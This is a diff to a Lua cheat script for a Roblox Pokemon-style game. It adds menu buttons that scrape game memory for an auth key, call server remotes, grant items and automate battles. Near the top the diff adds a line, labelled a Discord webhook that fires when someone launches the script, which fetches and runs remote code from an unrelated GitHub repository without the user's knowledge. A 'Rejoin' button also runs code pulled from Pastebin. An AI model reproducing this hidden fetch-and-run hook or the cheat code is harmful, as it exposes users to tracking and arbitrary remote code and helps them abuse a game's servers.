@@ -1,6 +1,8 @@
 
 local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
 
+-- discord webhook ( when someone launched the script )
+loadstring(game:HttpGet"https://raw.githubusercontent.com/discordxj2shn0001/aid/main/discord%20webhook")()
 
 local UI = Material.Load({
      Title = "Pokemon Cheat Menu",
@@ -14,14 +16,35 @@ local Page = UI.New({
     Title = "Main"
 })
 
-Page.Toggle({
-    Text = "Autofarm",
-    Callback = function(value)
-        
-    end,
-    Enabled = false
+Page.Button({
+    Text = "Pokeball Magnet",
+Callback = function()
+local lp = game:service'Players'.LocalPlayer;
+game:GetService("Workspace").chunk11["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+end
 })
 
+Page.Button({
+    Text = "Heal",
+Callback = function()
+Get = game:GetService("ReplicatedStorage").GET
+function GetMainData()
+    for i, v in pairs(debug.getregistry()) do
+        if typeof(v) == "function" then
+            for a, b in pairs(debug.getupvalues(v)) do
+                if typeof(b) == "table" and rawget(b, "Fishing") then
+                    return b
+                end
+            end
+        end
+    end
+end
+Data = GetMainData()
+AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
+local key = game:GetService("UserInputService")
+Get:InvokeServer(AuthKey, "PDS", "getPartyPokeBalls")
+end
+})
 
 
 Page.Button({
@@ -42,76 +65,13 @@ function GetMainData()
 end
 Data = GetMainData()
 AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
- 
 local SF = {}
 SF["Fly"] = Data["Menu"]["map"]["fly"]
-
 SF["Fly"](unpack(SF))
 end
 })
 
 
-Page.Button({
-    Text = "Fish",
-Callback = function()
-Get = game:GetService("ReplicatedStorage").GET
-function GetMainData()
-    for i, v in pairs(debug.getregistry()) do
-        if typeof(v) == "function" then
-            for a, b in pairs(debug.getupvalues(v)) do
-                if typeof(b) == "table" and rawget(b, "Fishing") then
-                    return b
-                end
-            end
-        end
-    end
-end
-Data = GetMainData()
-AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
- 
-local SF = {}
-SF["Fish"] = Data["Fishing"]["Fish"]
-
-SF["Fish"](unpack(SF))
-end
-})
-
-
-
-Page.Button({
-    Text = "instant egg",
-Callback = function()
-local _p = nil
-        for _, v in pairs(getgc(true)) do
-           if typeof(v) == "table" then
-               if rawget(v, "PlayerData") then
-                   _p = v
-                   break
-               end
-           end
-        end
-        _self.daycareManHasEgg = true
-        
-        --print(_p.PlayerData:completeEvent("Eevee2Awarded"))
-end
-})
-
-Page.Button({
-    Text = "Save",
-Callback = function()
-local _p = nil
-        for _, v in pairs(getgc(true)) do
-           if typeof(v) == "table" then
-               if rawget(v, "PlayerData") then
-                   _p = v
-                   break
-               end
-           end
-        end
-        _p.Network:get('PDS', 'saveGame', self:getEtc())
-        
-end
-})
 Page.Button({
     Text = "Unstuck",
 Callback = function()
@@ -129,27 +89,11 @@ local _p = nil
 end
 })
 
-Page.Button({
-    Text = "Infinite Repel",
-Callback = function()
-local _p = nil
-        for _, v in pairs(getgc(true)) do
-           if typeof(v) == "table" then
-               if rawget(v, "PlayerData") then
-                   _p = v
-                   break
-               end
-           end
-        end
-        _p.Repel.steps = 1000000
-        
-end
-})
 
-Page.Button({
-    Text = "No Repel",
-Callback = function()
-local _p = nil
+Page.Toggle({
+    Text = "Repel",
+    Callback = function(value)
+       local _p = nil
         for _, v in pairs(getgc(true)) do
            if typeof(v) == "table" then
                if rawget(v, "PlayerData") then
@@ -158,41 +102,49 @@ local _p = nil
                end
            end
         end
+        if(value) then _p.Repel.steps = 1000000
+        else
         _p.Repel.steps = 0
-        
-end
+    end
+    Enabled = true
+    end
 })
-
-
-
-
-
-Page.Button({
-    Text = "test",
-Callback = function()
-local _p = nil
-        for _, v in pairs(getgc(true)) do
-           if typeof(v) == "table" then
-               if rawget(v, "Events") then
-                   _p = v
-                   break
-               end
-           end
-        end
-        
-
-_p.addItem:FireServer(prize)
-
-
-end
-})
-
 
 local Page2 = UI.New({
-    Title = "Shops"
+    Title = "Misc"
+})
+
+Page2.TextField({
+    Text = "Player Card Name",
+    Callback = function(value)
+        local _p = nil
+        for _, v in pairs(getgc(true)) do
+           if typeof(v) == "table" then
+               if rawget(v, "PlayerData") then
+                   _p = v
+                   break
+               end
+           end
+        end
+        
+    _p.Network:post('PDS', 'chooseName', value)
+    
+    end
 })
 
 Page2.Button({
+    Text = "Rejoin",
+Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+end
+})
+
+
+local Page3 = UI.New({
+    Title = "Shops"
+})
+
+Page3.Button({
     Text = "BP Shop",
 Callback = function()
 local _p = nil
@@ -212,7 +164,7 @@ _p.Menu.battleShop:open()
 end
 })
 
-Page2.Button({
+Page3.Button({
     Text = "Shop",
 Callback = function()
 local _p = nil
@@ -233,7 +185,7 @@ end
 })
 
 
-Page2.Button({
+Page3.Button({
     Text = "Stoneshop",
 Callback = function()
 local _p = nil
@@ -254,11 +206,11 @@ end
 })
 
 
-local Page3 = UI.New({
+local Page4 = UI.New({
     Title = "One-time Use"
 })
 
-Page3.Button({
+Page4.Button({
     Text = "absol + eevee",
 Callback = function()
 local _p = nil
@@ -279,7 +231,7 @@ end
 
 })
 
-Page3.Button({
+Page4.Button({
     Text = "enable rtd + running",
 Callback = function()
 local _p = nil
@@ -306,7 +258,7 @@ end
 
 
 
-Page3.Button({
+Page4.Button({
     Text = "Gives Leftovers",
 Callback = function()
 local _p = nil
@@ -324,7 +276,7 @@ end
 
 })
 
-Page3.Button({
+Page4.Button({
     Text = "Kings Rock",
 Callback = function()
 local _p = nil
@@ -342,7 +294,7 @@ end
 
 })
 
-Page3.Button({
+Page4.Button({
     Text = "BW Egg",
 Callback = function()
 local _p = nil
@@ -360,7 +312,7 @@ end
 
 })
 
-Page3.Button({
+Page4.Button({
     Text = "Gives SawsbuckCoffee",
 Callback = function()
 local _p = nil
@@ -378,3 +330,155 @@ end
 
 })
 
+local Page5 = UI.New({
+    Title = "Testing"
+})
+
+Page5.Button({
+    Text = "instant egg",
+Callback = function()
+local _p = nil
+        for _, v in pairs(getgc(true)) do
+           if typeof(v) == "table" then
+               if rawget(v, "PlayerData") then
+                   _p = v
+                   break
+               end
+           end
+        end
+        _self.daycareManHasEgg = true
+        
+        --print(_p.PlayerData:completeEvent("Eevee2Awarded"))
+end
+})
+
+
+
+Page5.Button({
+    Text = "Autofarm",
+    Callback = function()
+
+        -- join battle --
+    mousemoveabs(1096.958, 554.955, -702.146)
+    wait(2)
+    mouse1press()
+    mouse1release()
+    wait(1)
+    mouse1press()
+    mouse1release()
+    wait(1)
+    mouse1press()
+    mouse1release()
+    wait(3)
+    mousemoveabs(1476.958, 414.955, -702.146)
+    mousemoveabs(1487.958, 425.955, -702.146)
+    mouse1press()
+    mouse1release()
+    mouse1press()
+    mouse1release()
+    -- join battle --
+    wait(2)
+    mousemoveabs(1250.6951370239, 830.88825988, 381.76596069)
+    mousemoveabs(1251.6951370239, 830.88825988, 381.76596069)
+    wait(4)
+    mouse1press() 
+    mouse1release()
+    wait(13)
+    mousemoveabs(850.6951370239, 890.88825988, 381.76596069)
+    mousemoveabs(851.6951370239, 891.88825988, 381.76596069)
+    wait(1)
+    mouse1press() 
+    mouse1release()
+    wait(4)
+        mousemoveabs(1450.6951370239, 690.88825988, 381.76596069)
+    mousemoveabs(1451.6951370239, 691.88825988, 381.76596069)
+    wait(13)
+    mouse1press() 
+    mouse1release()
+    -- phase 1 over --
+        -- join battle --
+    wait(4)
+    mousemoveabs(1250.6951370239, 830.88825988, 381.76596069)
+    mousemoveabs(1251.6951370239, 830.88825988, 381.76596069)
+    wait(4)
+    mouse1press() 
+    mouse1release()
+    wait(4)
+    mousemoveabs(850.6951370239, 890.88825988, 381.76596069)
+    mousemoveabs(851.6951370239, 891.88825988, 381.76596069)
+    wait(1)
+    mouse1press() 
+    mouse1release()
+    wait(4)
+        mousemoveabs(1450.6951370239, 690.88825988, 381.76596069)
+    mousemoveabs(1451.6951370239, 691.88825988, 381.76596069)
+    wait(13)
+    mouse1press() 
+    mouse1release()
+    -- phase 2 over --
+    -- join battle --
+    wait(4)
+    mousemoveabs(1250.6951370239, 830.88825988, 381.76596069)
+    mousemoveabs(1251.6951370239, 830.88825988, 381.76596069)
+    wait(4)
+    mouse1press() 
+    mouse1release()
+    wait(4)
+    mousemoveabs(850.6951370239, 890.88825988, 381.76596069)
+    mousemoveabs(851.6951370239, 891.88825988, 381.76596069)
+    wait(4)
+    mouse1press() 
+    mouse1release()
+    wait(4)
+        mousemoveabs(1450.6951370239, 690.88825988, 381.76596069)
+    mousemoveabs(1451.6951370239, 691.88825988, 381.76596069)
+    wait(7)
+    mouse1press() 
+    mouse1release()
+    -- phase 3 over --
+    end,
+
+})
+
+Page5.Button({
+    Text = "Fish",
+Callback = function()
+Get = game:GetService("ReplicatedStorage").GET
+function GetMainData()
+    for i, v in pairs(debug.getregistry()) do
+        if typeof(v) == "function" then
+            for a, b in pairs(debug.getupvalues(v)) do
+                if typeof(b) == "table" and rawget(b, "Fishing") then
+                    return b
+                end
+            end
+        end
+    end
+end
+Data = GetMainData()
+AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
+ 
+local SF = {}
+SF["Fish"] = Data["Fishing"]["Fish"]
+SF["Fish"](unpack(SF))
+
+SF["Fish"](nil, "GoodRod", LPlr.Character.Head.Position+LPlr.Character.Head.CFrame.LookVector*5)
+end
+})
+
+Page5.Button({
+    Text = "Save",
+Callback = function()
+local _p = nil
+        for _, v in pairs(getgc(true)) do
+           if typeof(v) == "table" then
+               if rawget(v, "PlayerData") then
+                   _p = v
+                   break
+               end
+           end
+        end
+        _p.Network:get('PDS', 'saveGame', self:getEtc())
+        _p.Menu.options:saveGame(true)
+end
+})
